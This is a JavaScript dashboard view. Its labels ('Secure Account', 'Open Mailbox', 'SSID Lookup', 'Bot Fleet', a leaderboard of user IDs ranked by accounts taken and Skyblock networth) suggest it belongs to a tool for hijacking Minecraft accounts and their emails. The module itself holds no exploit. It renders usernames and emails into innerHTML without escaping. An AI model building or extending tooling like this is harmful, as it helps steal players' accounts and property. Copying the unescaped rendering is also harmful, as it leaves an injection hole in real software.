// Overview View Module
const OverviewView = {
  async render() {
    const container = document.getElementById('view-content');
    container.innerHTML = App.waveDots('Loading dashboard overview...', 'lg');

    try {
      const res = await API.get('/api/stats/overview');
      const data = res.data;

      container.innerHTML = `
        <!-- Top Stats Row -->
        <div class="grid-stats stagger-in">
          <div class="stat-card">
            <div class="stat-header">
              <span class="stat-label">Total Secured</span>
              <div class="stat-icon primary"><i class="fas fa-shield-alt"></i></div>
            </div>
            <div class="stat-value">${data.totalAccounts}</div>
            <div class="stat-sub">Accounts registered</div>
          </div>

          <div class="stat-card">
            <div class="stat-header">
              <span class="stat-label">Owns Minecraft</span>
              <div class="stat-icon success"><i class="fas fa-cube"></i></div>
            </div>
            <div class="stat-value">${data.ownsMcCount}</div>
            <div class="stat-sub">Valid MC licenses</div>
          </div>

          <div class="stat-card">
            <div class="stat-header">
              <span class="stat-label">Special Capes</span>
              <div class="stat-icon warning"><i class="fas fa-vest"></i></div>
            </div>
            <div class="stat-value">${data.capesCount}</div>
            <div class="stat-sub">Rare/vanity capes</div>
          </div>

          <div class="stat-card">
            <div class="stat-header">
              <span class="stat-label">Total Networth</span>
              <div class="stat-icon info"><i class="fas fa-coins"></i></div>
            </div>
            <div class="stat-value">${this.formatCoins(data.totalNetworth)}</div>
            <div class="stat-sub">Skyblock valuation</div>
          </div>

          <div class="stat-card">
            <div class="stat-header">
              <span class="stat-label">Active Bots</span>
              <div class="stat-icon primary"><i class="fas fa-robot"></i></div>
            </div>
            <div class="stat-value">${data.activeBots}</div>
            <div class="stat-sub">Configured bot slots</div>
          </div>

          <div class="stat-card">
            <div class="stat-header">
              <span class="stat-label">Quarantined</span>
              <div class="stat-icon danger"><i class="fas fa-lock"></i></div>
            </div>
            <div class="stat-value">${data.quarantineCount}</div>
            <div class="stat-sub">Secured from lock</div>
          </div>
        </div>

        <!-- Quick Actions Bar -->
        <div class="card" style="margin-bottom:24px;">
          <div class="card-header">
            <span class="card-title"><i class="fas fa-bolt"></i> Quick Operations</span>
          </div>
          <div class="card-body" style="display:flex;flex-wrap:wrap;gap:12px;">
            <button class="btn btn-primary" onclick="App.navigate('secure')">
              <i class="fas fa-key"></i> Secure Account
            </button>
            <button class="btn btn-secondary" onclick="App.navigate('emails')">
              <i class="fas fa-envelope-open-text"></i> Open Mailbox
            </button>
            <button class="btn btn-secondary" onclick="App.navigate('tools', { tool: 'ssid' })">
              <i class="fas fa-id-badge"></i> SSID Lookup
            </button>
            <button class="btn btn-secondary" onclick="App.navigate('tools', { tool: 'hypixel' })">
              <i class="fas fa-gamepad"></i> Hypixel Stats
            </button>
            <button class="btn btn-secondary" onclick="App.navigate('bots')">
              <i class="fas fa-plus"></i> Bot Fleet
            </button>
            <button class="btn btn-secondary" onclick="App.navigate('builder')">
              <i class="fas fa-palette"></i> Embed Designer
            </button>
          </div>
        </div>

        <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(420px, 1fr));gap:24px;">
          <!-- Recent Accounts -->
          <div class="card" style="margin-bottom:0;">
            <div class="card-header">
              <span class="card-title"><i class="fas fa-history"></i> Recent Secured Accounts</span>
              <button class="btn btn-secondary btn-sm" onclick="App.navigate('accounts')">View All</button>
            </div>
            <div class="card-body" style="padding:0;">
              <div class="table-wrapper" style="border:none;border-radius:0;">
                <table>
                  <thead>
                    <tr>
                      <th>IGN</th>
                      <th>Email</th>
                      <th>MC</th>
                      <th>Action</th>
                    </tr>
                  </thead>
                  <tbody>
                    ${(data.recentAccounts && data.recentAccounts.length) ? data.recentAccounts.map(acc => `
                      <tr>
                        <td>
                          <div style="display:flex;align-items:center;gap:8px;">
                            <img src="https://visage.surgeplay.com/bust/${acc.username}?y=-40" 
                                 onerror="this.src='https://cdn.pfps.gg/pfps/59339-erwan-meunier.gif'"
                                 style="width:24px;height:24px;border-radius:4px;" />
                            <span style="font-weight:600;">${acc.username || 'Unknown'}</span>
                          </div>
                        </td>
                        <td style="color:var(--text-muted);font-family:var(--font-mono);font-size:0.78rem;">
                          ${acc.email || 'N/A'}
                        </td>
                        <td>
                          <span class="badge-tag ${acc.ownsmc && !acc.ownsmc.includes('Failed') ? 'success' : 'danger'}">
                            ${acc.ownsmc || 'None'}
                          </span>
                        </td>
                        <td>
                          <button class="btn btn-secondary btn-sm" onclick="AccountsView.inspectAccount('${acc.uid}')">
                            <i class="fas fa-search"></i>
                          </button>
                        </td>
                      </tr>
                    `).join('') : `
                      <tr>
                        <td colspan="4" style="text-align:center;padding:28px;color:var(--text-dim);">
                          No accounts secured yet.
                        </td>
                      </tr>
                    `}
                  </tbody>
                </table>
              </div>
            </div>
          </div>

          <!-- Top Networth Leaderboard -->
          <div class="card" style="margin-bottom:0;">
            <div class="card-header">
              <span class="card-title"><i class="fas fa-trophy"></i> Top Leaderboard</span>
              <span class="badge-tag info">Live Rankings</span>
            </div>
            <div class="card-body" style="padding:0;">
              <div class="table-wrapper" style="border:none;border-radius:0;">
                <table>
                  <thead>
                    <tr>
                      <th>Rank</th>
                      <th>User ID</th>
                      <th>Accounts</th>
                      <th>Networth</th>
                    </tr>
                  </thead>
                  <tbody>
                    ${(data.leaderboard && data.leaderboard.length) ? data.leaderboard.map((lb, index) => `
                      <tr>
                        <td>
                          <span class="badge-tag ${index === 0 ? 'warning' : 'info'}">
                            #${index + 1}
                          </span>
                        </td>
                        <td style="font-family:var(--font-mono);font-size:0.78rem;">
                          ${lb.user_id}
                        </td>
                        <td style="font-weight:600;">${lb.amount || 0}</td>
                        <td style="font-weight:700;color:#34d399;">
                          ${OverviewView.formatCoins(lb.networth)}
                        </td>
                      </tr>
                    `).join('') : `
                      <tr>
                        <td colspan="4" style="text-align:center;padding:28px;color:var(--text-dim);">
                          No leaderboard data yet.
                        </td>
                      </tr>
                    `}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        </div>

        <!-- System Health Footer Widget -->
        <div class="card" style="margin-top:24px;">
          <div class="card-header">
            <span class="card-title"><i class="fas fa-server"></i> System Health & Host Specs</span>
            <span class="status-pill"><span class="status-dot"></span> Online</span>
          </div>
          <div class="card-body" style="display:grid;grid-template-columns:repeat(auto-fit, minmax(180px, 1fr));gap:16px;">
            <div>
              <div style="font-size:0.75rem;color:var(--text-dim);">Platform</div>
              <div style="font-weight:600;">${data.systemInfo?.platform} (${data.systemInfo?.arch})</div>
            </div>
            <div>
              <div style="font-size:0.75rem;color:var(--text-dim);">Node.js</div>
              <div style="font-weight:600;">${data.systemInfo?.nodeVersion}</div>
            </div>
            <div>
              <div style="font-size:0.75rem;color:var(--text-dim);">Memory Usage</div>
              <div style="font-weight:600;">${data.systemInfo?.totalMemMB - data.systemInfo?.freeMemMB} / ${data.systemInfo?.totalMemMB} MB</div>
            </div>
            <div>
              <div style="font-size:0.75rem;color:var(--text-dim);">CPU Cores</div>
              <div style="font-weight:600;">${data.systemInfo?.cpuCount} Cores</div>
            </div>
            <div>
              <div style="font-size:0.75rem;color:var(--text-dim);">Host Uptime</div>
              <div style="font-weight:600;">${data.systemInfo?.uptimeHours} hours</div>
            </div>
          </div>
        </div>
      `;
    } catch (err) {
      container.innerHTML = `
        <div class="card" style="border-color:var(--danger);">
          <div class="card-body" style="text-align:center;padding:40px;">
            <i class="fas fa-exclamation-triangle fa-2x" style="color:var(--danger);margin-bottom:12px;"></i>
            <h3 style="color:var(--danger);">Failed to load overview data</h3>
            <p style="color:var(--text-muted);margin:10px 0;">${err.message}</p>
            <button class="btn btn-secondary" onclick="OverviewView.render()">Retry</button>
          </div>
        </div>
      `;
    }
  },

  formatCoins(num) {
    if (!num) return '0';
    const n = parseFloat(num);
    if (n >= 1_000_000_000) return (n / 1_000_000_000).toFixed(2) + 'B';
    if (n >= 1_000_000) return (n / 1_000_000).toFixed(2) + 'M';
    if (n >= 1_000) return (n / 1_000).toFixed(1) + 'K';
    return n.toLocaleString();
  }
};

window.OverviewView = OverviewView;
